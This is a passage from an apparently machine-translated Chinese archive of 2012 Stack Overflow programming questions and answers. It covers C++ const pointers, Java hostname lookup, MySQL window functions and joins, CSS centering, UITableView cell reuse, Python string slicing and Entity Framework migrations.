2.  ASP.NET 只是部分解释。用于服务器端代码的 C# 或 Visual Basic 已编译。IS 解释的是直接在页面上的代码。请记住，尽管您的大部分逻辑并没有发生在那里......它发生在编译的代码页中，并且页面代码主要用于显示您已经计算的内容。但是不要忘记，当页面提供给用户时，您在页面上的 HTML 中放入的任何服务器端标签都会被解析并删除。如果您有标签 <%: ViewData["value"] %>，则用户在查看您的源代码时只会看到“value”的值，而不是实际的服务器端标签。

3.  您将很难在两周内学习 ASP.NET 并完成您的应用程序。我个人喜欢 ASP.NET MVC，但如果你没有太多的 Web 编程背景，那么与 Web 窗体相比，它可能不是最容易学习的东西。话虽如此...

4.  我不是 PHP 的粉丝，但它被广泛使用并且是快速设置简单项目的好语言。那里也有大量示例，它是人们学习的第一种网络语言（部分原因是这些原因）。如果您有两周的时间来学习一门语言并建立一个项目，那就选择 PHP。即使有 C 背景，Web 编程也不仅仅是了解一种服务器端语言，因此最好使用一种快速而肮脏的语言，以最小的努力完成你想要完成的事情。也就是说，PHP。

# c++ - C++中的双指针和常量

> ID：11806518
> 
> 赞同：0
> 
> 时间：2012-08-04T06:40:02.087
> 
> 标签：c++, opencv

我在opencv中使用了一个名为'calcHist'的函数。它的声明是：

```
void calcHist(const Mat* arrays, int narrays, const int* channels, InputArray mask, OutputArray hist, int dims, const int* histSize, const float** ranges, bool uniform=true, bool accumulate=false ) 
```

我写了一个代码片段：

```
Mat img = imread("lena.jpg", CV_LOAD_IMAGE_GRAYSCALE);

Mat* arrays = &img;
int narrays = 1;
int channels[] = { 0 };
InputArray mask = noArray();
Mat hist;
int dims = 1;
int histSize[] = { 256 };   
float hranges[] = { 0.0, 255.0 };
float *ranges[] = { hranges };

calcHist(arrays, narrays, channels, mask, hist, dims, histSize, ranges); 
```

然后得到一个错误：IntelliSense：没有重载函数“calcHist”的实例与参数列表匹配
但是如果我将'const'前缀为'float *ranges [] = {ranges};' 就像`const float *ranges[] = { hranges };`没关系一样。

那么为什么这个 'const' 是必要的，而 histSize 之前的 'const' 不是。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-04T06:45:29.153

`T*`隐式转换为`const T*`. 相应地，这意味着`T**`隐式转换为`T*const*`. `T*const*`is not `const T**`，因此此转换无法让您进行函数调用。

# c# - 项目构建和运行问题

> ID：11806521
> 
> 赞同：0
> 
> 时间：2012-08-04T06:40:22.930
> 
> 标签：c#, asp.net

在构建和运行项目时，我弹出调试未启用。

它显示，该页面无法在调试模式下运行，因为在 web.config 中未启用调试

在选择 Run without debugging 时，它显示 Unable to launch because port is in use。但我试图通过选择使用 IIS Web 服务器来解决它，我有一个弹出窗口，你需要配置虚拟目录。

请帮助我们。

现在这一次构建和运行成功但页面显示空白。请告诉我们

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-04T06:42:34.713

查看您的 web.config 文件。为“调试”执行 CTRL+F。有一个简单的 XML 条目称为 DebuggingEnabled 或类似的东西。它默认设置为 false，因此只需将其设置为 true，保存您的项目并重试。

# java - 如何根据 IP 地址获取主机名？

> ID：11806523
> 
> 赞同：6
> 
> 时间：2012-08-04T06:40:39.010
> 
> 标签：java, network-programming

我想根据程序中给定的 IP 地址查找主机名。是否有可能得到它，如果可以，请您提供代码。谢谢。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-08-04T06:42:56.687

是的，有可能。

```
import java.net.*;
public class HostName
{
  public static void main(String args[])
  {
    InetAddress inetAddress =InetAddress.getByName("127.64.84.2");//get the host Inet using ip
    System.out.println ("Host Name: "+ inetAddress.getHostName());//display the host
  }
} 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-08-04T06:43:00.703

像这样的事情应该指向正确的方向：

```
import java.net.InetAddress;
import java.net.UnknownHostException;

public class DNSLookup {
  public static void main(String args[]) {
    try {
      InetAddress host;
      if (args.length == 0) {
        host = InetAddress.getLocalHost();
      } else {
        host = InetAddress.getByName(args[0]);
      }
      System.out.println("Host:'" + host.getHostName()
          + "' has address: " + host.getHostAddress());

    } catch (UnknownHostException e) {
      e.printStackTrace();
    }
  }
} 
```

[来源](http://www.jeggu.com/2009/12/dns-lookup-using-java.html)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-04T06:46:07.323

您可以使用类`getHostName()`的方法`InetAddress`。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-04T06:46:10.340

**试试这个....**

`System.out.println(InetAddress.getByName("IP_ADDR").getHostName());`

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2015-01-17T09:29:58.460

嘿，我正在使用上述方法，但 getHostName() 方法没有返回给定 ip 的主机名。

见代码：

```
try {
//        This is ip of tutorialspoint.com    
           InetAddress addr2 = InetAddress.getByName("127.64.84.2");     
            op.setText("Host name is: "+addr2.getHostName());
        }   
        catch ( UnknownHostException e3) {  
            op.setText("Error: Host not found" + e3);
        } 
```

# android - onTextChanged 上的 NullPointerException

> ID：11806526
> 
> 赞同：1
> 
> 时间：2012-08-04T06:40:46.893
> 
> 标签：android, android-edittext, custom-component

我正在创建一个富文本编辑器，所以我有一个扩展的 EditText，它接收一个带有子组件的 ViewGroup。这个 ViewGroup 是一个工具栏，带有用于粗体等的切换按钮。

EditText 以这种方式接收工具栏：

```
private ViewGroup toolbar;

public CustomEditText(Context context, LinearLayout newToolbar) {
    super(context);
    toolbar = newToolbar;
} 
```

使用此代码，CustomEditText 成功控制了工具栏的可见性：

```
@Override
protected void onFocusChanged(boolean focused, int direction,
        Rect previouslyFocusedRect) {       
    super.onFocusChanged(focused, direction, previouslyFocusedRect);

    if (focused)
        toolbar.setVisibility(View.VISIBLE);
    else
        toolbar.setVisibility(View.GONE);
} 
```

但不幸的是，例如，这会返回*NullPointerException*：

```
@Override
protected void onTextChanged(CharSequence text, int start,
        int lengthBefore, int lengthAfter) {
    super.onTextChanged(text, start, lengthBefore, lengthAfter);    

    toolbar.setVisibility(View.GONE);
} 
```

我知道在当前活动中向我的 CustomEditText 添加一个 TextWatcher 可以解决，但我试图让 CustomEditText 处理与之相关的所有内容。

你知道为什么一切都适用于**onFocusChanged**，但不适用于**onTextChanged**吗？

# mysql - mysql是否有相当于Oracle的“分析功能”？

> ID：11806528
> 
> 赞同：17
> 
> 时间：2012-08-04T06:41:16.183
> 
> 标签：mysql, sql, database, oracle

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2013-12-06T19:49:22.910

只是想告诉你，你可以在 MySQL 中使用变量来模拟分析函数。例如，SUM OVER 可以按如下方式完成：

```
 SELECT amount, 
    @sum := @sum + amount as sum 
FROM tbl
JOIN (SELECT @sum := 0) s 

```

如果你想`PARTITION BY`，它是可能的，但只是有点复杂。基本上，您添加另一个`@variable`来监视帐户（或您想要分区的任何内容），按帐户（或您的变量）排序，然后`@sum`在帐户更改时重置。如下：

```
 SELECT account, 
    amount, 
    (case when @account != account then @sum := amount else @sum := @sum + amount end) as sum,
    (case when @account != account then @account := account else @account end) as _
FROM (SELECT * FROM tbl ORDER BY account)
JOIN (SELECT @sum := 0) s
JOIN (SELECT @account := '') a 

```

您会注意到为实现分区效果必须进行的两个主要更改：

1.  主表 ( `tbl`) 包含在带有`ORDER BY`子句的子选择中。这是必要的，因为当 MySQL 进行`@account`变量测试时，值需要已经被排序。如果这没有发生，您将得到不正确的总和值以及帐户值。

2.  有一个别名为 'extra' 的列`as _`。使用结果时可以忽略此列，但检查和更改的顺序`@account`需要在`@sum`检查和更改之后。

    *此外，如果您不介意帐户排在最后，您可以选择重新排序列。这是通过取出第一`account`列来完成的，因为它与最后一列重复，`_`然后显然将别名重命名`_`为`account`.*

**资源：**

*   [http://dev.mysql.com/doc/refman/5.0/en/user-variables.html](http://dev.mysql.com/doc/refman/5.0/en/user-variables.html)
*   [https://stackoverflow.com/a/2563940/263175](https://stackoverflow.com/a/2563940/263175)

* * *

## 回答 #2

> 赞同：17
> 
> 时间：2012-08-04T07:33:43.903

~~不，与 MSSQL、Oracle、PostgreSQL 等其他 DBMS 相比，这是 MySQL 的主要缺陷之一。我强烈怀疑将来会在 MySQL 中看到 Window Functions，尤其是在 Oracle 收购 MySQL 之后……~~

**更新 04/2018**

MySQL 8.0 现在支持[窗口函数](https://dev.mysql.com/doc/refman/8.0/en/window-functions.html)。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-08-21T10:05:42.397

虽然 MySQL 不支持分析函数，但[MariaDB](https://mariadb.org/)支持。它是 MySQL 的直接替代品，由 MySQL 的原始开发人员创建。

* * *

## 回答 #4

> 赞同：-5
> 
> 时间：2012-08-31T13:31:23.790

有一个用于 SQL Server 的商业产品，它提供数据库内分析功能，它可以通过“链接服务器”/odbc 连接到 oracle 或 MySQL 数据库 - 这是一篇描述它的文章： [http ://westclintech.com/Blog /tabid/132/EntryId/88/Using-XLeratorDB-with-MySQL-and-other-RDBMS-s.aspx](http://westclintech.com/Blog/tabid/132/EntryId/88/Using-XLeratorDB-with-MySQL-and-other-RDBMS-s.aspx)

这需要有 Windows o/s 和 SQL Server 2005 或更高版本（Express 版本是免费的）

# html - 如何在div内垂直居中跨度和列表？

> ID：11806534
> 
> 赞同：1
> 
> 时间：2012-08-04T06:42:27.237
> 
> 标签：html, css, centering

我有一个 div 固定在浏览器的顶部。div 有 100% 的宽度和 90px 的高度。里面是一段应该放在左边的文本和一个应该放在右边的水平列表。现在，我将跨度浮动到左侧，将列表浮动到右侧。如何在 div 中垂直居中跨度和列表？

[http://jsfiddle.net/4keeS/6/](http://jsfiddle.net/4keeS/6/)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-04T10:39:19.380

如果您知道标题跨度和 UL 内容的高度，则可以使用

```
position:absolute /* or relative */;
top:50%;
margin-top: -X /* where X is half the height of your content. That's a negative margin pulling the content up so it's center aligns with the center of the parent div */; 
```

见这里：http: [//jsfiddle.net/XAgyv/1/](http://jsfiddle.net/XAgyv/1/)

在不知道垂直居中的内容高度的情况下，我还没有找到任何好的方法来做到这一点 - 我期待看到其他答案。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-04T06:49:03.260

这是一个解决方案...

[http://jsfiddle.net/4keeS/7/](http://jsfiddle.net/4keeS/7/)

...在跨度和李上使用它

```
display:inline-block;
line-height:70px;
height: 70px; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-04T10:20:25.880

不幸的是，垂直对齐仅适用于表格单元格（即：`TD`和`TH`元素）。
因此，您必须使用`TABLE`才能垂直对齐内容。

```
<html>
<head>
  <style>
    .text         { float: left; }
    .list         { list-style: none; float: right; margin: 0; }
    .list li      { float: left; }
    #vdivwrap     { width: 100%; }
    #vdivcontent  { height:90px; vertical-align: center; background:#8c8; }
  </style>
</head>
<body>
  <table id="vdivwrap" border="0" cellspacing="0" cellpadding="0">
    <td id="vdivcontent">
      <span class="text">[text span]</span>
      <ul class="list">
        <li>[list item 1]</li>
        <li>[list item 2]</li>
      </ul>
    </td>
  </table>
</body>
</html> 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2016-02-23T05:17:06.207

另一种解决方案是添加另一个 css 规则，如下所示

```
span, ul {
  position: relative;
  top: 50%;
  transform: translateY(-50%);
  -webkit-transform: translateY(-50%);
  -o-transform: translateY(-50%);
} 
```

这里正在工作 jsfiddle [http://jsfiddle.net/logiccanvas/4keeS/9/](http://jsfiddle.net/logiccanvas/4keeS/9/)

# mysql - MySql 递归逻辑

> ID：11806542
> 
> 赞同：3
> 
> 时间：2012-08-04T06:43:10.870
> 
> 标签：mysql, sql, recursion

我正在尝试根据角色（在其他表中指定）获取 munus 和子菜单。在角色的基础上，例如。如果我选择 MenuIDs: 1,2,5 我应该得到 M1、M2 和 M3 的所有子菜单。MenuParentID 指定父级的 MenuId。

```
 MenuID MenuParentID   MenuName           MenuNavigateUrl       HasSubMenus 
 1      -1             M1                 1.aspx                0 
 2      -1             M2                 #                     1 
 3       2             M2.1               2.aspx                0 
 4       2             M2.2               3.aspx                0 
 5      -1             M3                 #                     1 
 6       5             M3.1               #                     1
 7       5             M3.2               #                     1 
 8       6             M3.1.1             4.aspx                0 
 9       6             M3.1.2             5.aspx                0 
10       7             M3.2.1             6.aspx                0 
11       7             M3.2.2             7.aspx                0 
12      -1             M4                 #                     1 
13      12             M4.1               8.aspx                0 
14      12             M4.2               9.aspx                0 
```

这是我所做的：

```
DELIMITER $$

DROP FUNCTION IF EXISTS `myDB`.`GetPermissions`$$

CREATE DEFINER=`root`@`%` FUNCTION `GetPermissions`(
rootMenuID int(11)
) RETURNS varchar(200) CHARSET latin1
BEGIN
DECLARE menuIdList VARCHAR(100);
DECLARE menu_id INT(11);
DECLARE record_not_found INT DEFAULT 0;
DECLARE getMenuCursor CURSOR FOR SELECT DISTINCT(MenuId) FROM MenuIdListTable;
DECLARE CONTINUE HANDLER FOR NOT FOUND SET record_not_found = 1; 
CREATE TEMPORARY TABLE MenuIdListTable(MenuId INT(11) NULL);
SET menuIdList = ',';
IF((SELECT COUNT(*) FROM menus WHERE MenuParentID = rootMenuID) > 0) THEN
    INSERT INTO MenuIdListTable(MenuID) SELECT MenuID FROM menus WHERE    
MenuParentID = rootMenuID; 
    OPEN getMenuCursor;
    read_loop: LOOP
        FETCH getMenuCursor INTO menu_id;
        IF record_not_found THEN 
           LEAVE read_loop; 
        END IF;
        SET menuIdList = CONCAT(menuIdList,menu_id,',');
    END LOOP read_loop;
END IF;
DROP TEMPORARY TABLE MenuIdListTable;
SET menuIdList = SUBSTR(menuIdList,1,LENGTH(menuIdList)-1);
RETURN menuIdList;
END$$

DELIMITER ; 
```

但我无法应用递归逻辑来获取所有子菜单。前任。对于“M3”（MenuID = 5），我得到子菜单“M3.1”和“M3.2”；但不是他们的子菜单。即对于'M3.1'：'M3.1.1'，'M3.1.2'和对于'M3.2'：'M3.2.1'，'M3.2.2'。如果其中一个有子菜单，问题也会持续存在！请帮忙。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-04T07:37:23.713

来自 plsql 或来自其他缺少 mysql 的 dbs 的 CTE 的“先验连接”的乐趣。

由于我的大脑目前没有能力完全解析你给定的 mysql 函数，它只是引用：[http](http://explainextended.com/2009/03/17/hierarchical-queries-in-mysql/) ://explainextended.com/2009/03/17/hierarchical-queries-in-mysql/ 它指向你关于mysql中的层次结构的一些很好的解释（有时是邪恶的......比如只有一个选择中的树结构）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-04T11:27:29.600

试试这个代码：

```
DROP TABLE IF EXISTS temp;
CREATE TABLE temp(id int,MenuID int,MenuName varchar(50),MenuParentID int,HasSubMenus int) SELECT (@id:=@id+1) as id,MenuID,MenuName,MenuParentID,HasSubMenus from menus,
(SELECT @id:=0) id where MenuParentID = 5;
select * from temp;
DROP TABLE IF EXISTS output;
CREATE TABLE output(MenuID int,MenuName varchar(50),MenuParentID int,HasSubMenus int) select MenuID,MenuName,MenuParentID,HasSubMenus from  temp;

SET @idmin = (SELECT min(id) from temp);
SET @idmax = (SELECT max(id) from temp);

WHILE @idmin <= @idmax DO

INSERT INTO output(MenuID,MenuName,MenuParentID,HasSubMenus)
select MenuID,MenuName,MenuParentID,HasSubMenus from  menus where MenuParentID=(select MenuID from temp where id = @idmin);

SET @idmin=@idmin+1;

END WHILE;

select (@id:=@id) as id1,GROUP_CONCAT(MenuName,',') from output, (SELECT @id:=1) id1 group by id1; 
```

# asp.net - 显示从一个 div 到另一个 div 的图像溢出

> ID：11806548
> 
> 赞同：0
> 
> 时间：2012-08-04T06:44:03.917
> 
> 标签：asp.net, html, css

有关图像和图表，请参阅以下链接。[Image](http://i47.tinypic.com/kcif84.jpg) , [diagram](http://i50.tinypic.com/xp1s10.jpg) 这是示例图像。这里“消息”标题是左侧的单独 div 浮动 “Joe Smith and you” div 在右侧浮动。在左侧，所有消息都在单独的 div 中。现在我需要更改悬停时的背景图像，如下所示（如蓝色箭头）。背景图片需要从左div溢出到右div。我尝试了以下代码，但它不起作用。它被切割成适合 div 大小。我需要像在图像中一样显示完整的图像。

```
 <div onmouseover="this.className='msgHover'"></div> ` 
```

以上是div上的代码。我的CSS类是

```
.msgHover
    {
        background-image: url('Images/MsgHighlight.png');
        overflow:auto;
    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-04T07:02:27.000

你不能只是让背景图像溢出`div`. 但是，您可以`div`通过使用负右边距使整个溢出成为自己的边界：

```
#mydiv:hover
{
    margin-right: -50px;
} 
```

这将使整个`div`范围更广，而不会推动任何其他元素或影响网站的布局。这听起来正是你想要做的。[这是一个例子](http://jsfiddle.net/yXRqD/)。

使用这种方法，您不必首先使用两个`div`s 作弊，只需将背景图像应用到一个 s 上即可`div`。

* * *

看看[这个例子](http://jsfiddle.net/yXRqD/1/)，右边距在悬停时变为负数。

# java - Spring中的Bean依赖注入

> ID：11806549
> 
> 赞同：0
> 
> 时间：2012-08-04T06:44:07.237
> 
> 标签：java, spring, spring-mvc, dependencies, code-injection

我有四个项目项目 a ，项目 b ，项目 c ，项目 d。

我想在 b 中使用项目 c 的一些管理器类，但不能直接访问它。并且必须通过项目 a 来完成。

如果我将我的经理类从项目 c 移动到项目 a ，那么我有一些其他经理被称为我在项目 a 中无权访问。

我正在使用 spring 来配置这些 bean。春天有没有办法注入依赖，这样我就可以直接访问 b 中项目 c 的管理器类。

如何处理这个？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-04T10:34:39.223

最好有某种**主**项目，它具有将定义所有 bean的*主上下文。*这样您就可以从任何点访问 bean。

# objective-c - 为什么在制作自定义表格视图单元格时将可重用单元格出列两次

> ID：11806551
> 
> 赞同：0
> 
> 时间：2012-08-04T06:44:14.333
> 
> 标签：objective-c, ios, uitableview

我正在关注使用情节提要制作自定义表格视图单元的教程。我将 UILabel 拖动为单元格的子视图并将其标记设置为 1。关于数据源代码，我有两个问题。

1.  第二个出队语句的目的是什么？我知道这是一个 init 方法，而不是使用情节提要来制作自定义单元格。

2.  tableview 和 self.tableview 有什么区别？

    ```
    -(UITableViewCell*)tableView:(UITableView*)tableView cellForRowAtIndexPath:(NSIndexPath*)indexPath
    {
        static NSString *CellIdentifier = @"Cell";
        UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier:CellIdentifier];
        if (cell == nil) {
            cell = [self.tableView dequeueReusableCellWithIdentifier:CellIdentifier];
        }
        NSDictionary *dToAccess = (self.tableView==tableView)?[self.arForTable objectAtIndex:indexPath.row] : [self.arForSearch objectAtIndex:indexPath.row];
        [(UILabel*)[cell viewWithTag:1] setText:[dToAccess valueForKey:@"name"]];
        [(UILabel*)[cell viewWithTag:2] setText:[dToAccess valueForKey:@"value"]];
        return cell;
    } 
    ```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-04T22:22:39.113

对于您的第一个问题，第二个 dequeueReusableCellWithIdentifier: 看起来像一个错误。

这是 UITableView 的工作原理：

您的表格中可能有 50 行，但如果一次只有 10 行可见，您只需要制作 10 个单元格，然后当用户滚动时，您可以重用已离开屏幕的单元格，而不是总是释放它们并初始化'ing 出现在屏幕上的新单元格。UITableView 会保存已离开屏幕的单元格列表，当您调用 dequeueReusableCellWithIdentifier: 时，它会将其从屏幕外单元格列表中删除并将其返回给您。从这里您可以自定义单元格以供重复使用（更改其文本、颜色等）并将其返回。同样，这不是“init”方法，这是返回一个预先存在的单元格。

那么，让我们看看当这个 UITableView 第一次显示时会发生什么——在这个例子中，有 10 个可见单元格，所以 tableView 将调用 tableView:cellForRowAtIndexPath: 10 次来让单元格显示在这 10 个插槽中。每次调用它时，您都需要初始化并返回一个新的 UITableViewCell 来显示。（此时 dequeueReusableCellWithIdentifier: 将返回 nil，因为您还没有任何屏幕外单元格可重复使用）

当用户滚动您的列表时，单元格将开始离开屏幕，并且需要出现新的单元格。您不需要制作新的单元格，因为您已经创建了尽可能多的单元格，一次需要在屏幕上显示。您应该调用 dequeueReusableCellWithIdentifier: 来获取对已离开屏幕的单元格的引用，然后您可以重新使用该单元格。

我会像这样更改您的代码：

```
static NSString *CellIdentifier = @"Cell";

UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier: CellIdentifier];

if (cell == nil) {
    cell = [[[UITableViewCell alloc] initWithStyle: UITableViewCellStyleDefault
                                   reuseIdentifier: CellIdentifier] autorelease];
} 
```

现在，您在创建新单元之前检查可重复使用的单元。

对于你的第二个问题，

在您的示例中，tableView 是指传入的 tableView（请参阅方法签名中的“tableView”）。另外，如果您的类定义了一个名为 tableView 的属性，那么 self.tableView 将调用该属性的 getter。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-04T07:46:33.567

当苹果为第一部 iPhone 开发 UITableView 时，他们在滚动浏览它时遇到了性能问题。然后一位聪明的工程师发现，造成这种情况的原因是对象的分配是有代价的，所以他想出了一种重用单元的方法。

dequeueReusableCellWithIdentifier 方法用于返回一个已被标记为准备重用的单元格。

因此，每当表格视图中有很多行并且您要滚动它时，在滚动之前刚刚从上一个屏幕传递的单元格将被重用，而不是创建新的单元格。

并知道你的第二个问题的答案。我认为你应该参考这个链接：

[http://www.iphonedevsdk.com/forum/iphone-sdk-development/17669-when-use-self-objectname-just-objectname.html](http://www.iphonedevsdk.com/forum/iphone-sdk-development/17669-when-use-self-objectname-just-objectname.html)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-13T20:02:59.440

不需要两次出队，这段代码被破坏了。

# iphone - 带有 ios 地图的 Google Places API

> ID：11806552
> 
> 赞同：1
> 
> 时间：2012-08-04T06:44:19.857
> 
> 标签：iphone, ios

我刚刚开始研究 googles places API，并且在我读过的文档中

**如果您的应用程序在地图上显示 Places API 数据，则该地图必须由 Google 提供。**

现在看来，苹果似乎正在放弃谷歌地图来代替他们自己的解决方案，这对于想要在 ios 设备上的地图上使用这个 API 的人来说意味着什么？

# operating-system - 处理器寄存器

> ID：11806553
> 
> 赞同：2
> 
> 时间：2012-08-04T06:44:21.793
> 
> 标签：operating-system, cpu-registers

好吧，这是一个一直困扰着我的非常普遍的问题。我刚刚阅读了有关处理器寄存器的信息，并了解到它们基本上有 twp 大类 - 用户可见寄存器：以最小化内存引用并加快功能以及控制和状态寄存器 - 由处理器用于处理器本身的操作。任何人都可以解释，或者可能向我推荐一些可以增强我对这个概念的理解的链接。用户可见寄存器到底是什么意思？而且我还读到PC有时是用户可见的。这是什么意思？

提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-04T07:14:59.397

处理器通常具有少量用户可见寄存器，正如您所说，这些寄存器用于最大限度地减少内存使用。例如，编译器可能会将 for 循环中的控制变量分配给寄存器。寄存器读取时间通常比从 RAM 读取时间快几个数量级。事实上，寄存器甚至比缓存还要快。因此，当您的代码非常频繁地读取和/或修改变量时，用户可见寄存器可以帮助加快这些计算。通常，编译器非常有效地使用可用的用户寄存器。

另一方面，控制和状态寄存器通常具有很高的特权，普通用户可能无法访问。例如，处理器上通常有数百甚至数千个寄存器，这些寄存器保存核心温度或处理器型号等信息。处理器制造商在调试期间经常使用它们。

当人们说 PC 可能对用户可见时，他们指的是程序计数器，它是一个寄存器，用于保存指向接下来要执行的指令的指针（地址）。PC 中的地址用于从内存中加载指令寄存器 (IR)，然后对其进行解码和执行。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-04T07:09:26.093

好吧，自从我的操作系统课程和微处理器课程以来已经有一段时间了，但是课程中从未使用过“用户可见寄存器”这个术语。我快速谷歌你可以找到教授幻灯片的 PDF：http: [//umcs.maine.edu/~cmeadow/courses/cos335/COA12.pdf](http://umcs.maine.edu/~cmeadow/courses/cos335/COA12.pdf)。因此，“用户可见寄存器”只是既不是控制寄存器也不是状态寄存器的寄存器，但通常不区分“用户可见寄存器”这个子组。以下是常见寄存器类型及其作用的列表：[http ://en.wikipedia.org/wiki/Processor_register](http://en.wikipedia.org/wiki/Processor_register)

从你提出的问题和推论来看，你可能想从头开始，从图书馆借一本书可能会更有帮助。

# php - MySQL查询连接三个表

> ID：11806556
> 
> 赞同：2
> 
> 时间：2012-08-04T06:44:47.147
> 
> 标签：php, mysql, database

我有三个表：项目、列表、项目。

项目连接到 上的列表`project_id`，项目连接到 上的列表`list_id`，目标是获得每个列表的所有行数据。

**我尝试了什么？** 好吧，我实际上只能通过三个单独的查询/输出来做到这一点，然后用 PHP 遍历它们来组合数据。

是否可以编写查询，以便最终得到一个可以轻松迭代的数据对象？

```
project (w details)
-- list (and its details)
----- item (w details)
----- item (w details)
----- item (w details)
-- list (w details)
----- item (w details)
----- item (w details) 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-04T06:47:16.113

你的意思是这样的：

```
select
    a.project_id,
    b.list_id,
    c.item_id
from
    projects a
        join lists b
            on a.project_id=b.project_id
        join items c
            on b.list_id=c.list_id 
```

输出将类似于：

```
project_id | list_id | item_id
 1         | 5       |  45
 1         | 5       |  46
 1         | 8       |  12 
```

还是您想在一行中返回它的所有部分？

如果你想要一行，你可以按照以下方式做一些事情：

```
select
    a.project_id,
    group_concat(b.list_id) as listIDs,
    group_concat(c.item_id) as itemIDs
from
    projects a
        join lists b
            on a.project_id=b.project_id
        join items c
            on b.list_id=c.list_id 
```

但是在 PHP 中处理所有分组的东西会变得更加混乱。

输出将类似于：

```
project_id | list_id | item_id
 1         | 5,8     |  45, 46, 12 
```

您还可以混合搭配两者，以获得两全其美的效果：

```
select
    a.project_id,
    b.list_id as listIDs,
    group_concat(c.item_id) as itemIDs
from
    projects a
        join lists b
            on a.project_id=b.project_id
        join items c
            on b.list_id=c.list_id 
```

输出将类似于：

```
project_id | list_id | item_id
 1         | 5       |  45, 46
 1         | 8       |  12 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-04T06:50:53.167

试试这个：如果你想显示你投影的方式

```
select
    a.project_id,
    b.list_id,
    c.item_id
from
    projects a
    left join lists b  on a.project_id=b.project_id
    left join items c  on b.list_id=c.list_id
    order by b,c 
```

# python - 从字符串中删除前x个字符？

> ID：11806559
> 
> 赞同：132
> 
> 时间：2012-08-04T06:45:14.837
> 
> 标签：python, string

如何从字符串中删除前 x 个字符？例如，如果有一个字符串`lipsum`，他们将如何删除前 3 个字符并得到结果`sum`？

* * *

## 回答 #1

> 赞同：242
> 
> 时间：2012-08-04T06:45:57.037

```
>>> text = 'lipsum'
>>> text[3:]
'sum' 
```

有关详细信息，请参阅有关[字符串](http://docs.python.org/tutorial/introduction.html#strings)的官方文档，有关符号的简明摘要，请参阅[此](https://stackoverflow.com/questions/509211/good-primer-for-python-slice-notation)SO 答案。

* * *

## 回答 #2

> 赞同：23
> 
> 时间：2013-12-18T17:10:30.883

另一种方式（取决于您的实际需要）：如果要弹出前*n个*字符并保存弹出的字符和修改后的字符串：

```
s = 'lipsum'
n = 3
a, s = s[:n], s[n:]
print(a)
# lip
print(s)
# sum 
```

* * *

## 回答 #3

> 赞同：11
> 
> 时间：2012-08-04T06:45:31.313

```
>>> x = 'lipsum'
>>> x.replace(x[:3], '')
'sum' 
```

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2018-10-19T05:58:53.243

使用`del`.

例子：

```
>>> text = 'lipsum'
>>> l = list(text)
>>> del l[3:]
>>> ''.join(l)
'sum' 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2016-12-13T10:21:02.737

显示帐号的最后 3 位数字的示例。

```
x = '1234567890'   
x.replace(x[:7], '')

o/p: '890' 
```

# entity-framework - AutomaticMigrationsEnabled 是真还是假？

> ID：11806570
> 
> 赞同：34
> 
> 时间：2012-08-04T06:46:17.160
> 
> 标签：entity-framework, entity-framework-4, entity-framework-migrations

在 EF 项目中，是否有设置**AutomaticMigrationsEnabled**的最佳实践？

更多声明：

在我们的团队中，修改模型后，我们通常在包管理器控制台中运行“add-migration”和“update-databse”命令。当其他开发人员运行项目时会引发此错误：

> “无法删除数据库，因为它正在使用中”

每次发生这种情况时，第一个修改器应该是`Check In`整个项目，而其他修改器必须`GET`修改对象。在许多情况下，我们不想检查已经创建的模型和迁移！

这种情况很烦人，有没有解决这种问题的办法。提前致谢。

* * *

## 回答 #1

> 赞同：47
> 
> 时间：2012-08-05T09:07:56.680

自动迁移为你做了所有的魔法，但它们不允许严格的版本控制（你没有每个版本的特殊固定迁移）。如果没有严格的版本控制，您将无法跟踪数据库的版本，也无法进行显式升级（根本无法进行降级）。

如果您不打算在需要知道数据库版本的地方使用版本控制，并且如果您不打算使用降级，则可以简单地使用自动迁移。

> “无法删除数据库，因为它正在使用中”

看起来您正在处理共享数据库 = show stopper。每个开发人员都应该使用自己的数据库。

> 但不想检查已经创建的模型和迁移！

这是一个最佳实践，如果您想继续进行基于代码的迁移，您将必须遵循它。顺便提一句。有一种称为“持续集成”的做法 - 在持续集成中，您应该在提交成功构建并通过测试后立即*获得。*

* * *

## 回答 #2

> 赞同：14
> 
> 时间：2013-06-14T16:51:54.040

来自：http: [//msdn.microsoft.com/en-us/data/jj554735.aspx](http://msdn.microsoft.com/en-us/data/jj554735.aspx)

> **对团队环境的建议**
> 
> 您可以穿插自动和基于代码的迁移，但不建议在团队开发场景中这样做。如果您是使用源代码控制的开发人员团队的一员，您应该使用纯自动迁移或纯基于代码的迁移。鉴于自动迁移的局限性，我们建议在团队环境中使用基于代码的迁移。

# html - 如何在列表标签 中填写高度？

> ID：11806573
> 
> 赞同：0
> 
> 时间：2012-08-04T06:46:26.960
> 
> 标签：html, css

`<li>`是否可以仅使用 CSS 填充标签的高度？

中心栏文本有时比两侧长，所以我需要在需要时增加它们的高度。

这是我的代码：http: [//jsfiddle.net/U8WaH/16/](http://jsfiddle.net/U8WaH/16/)

CSS：

```
.table {
    margin: 0 auto;
}
.table ul li {
    margin: 0;
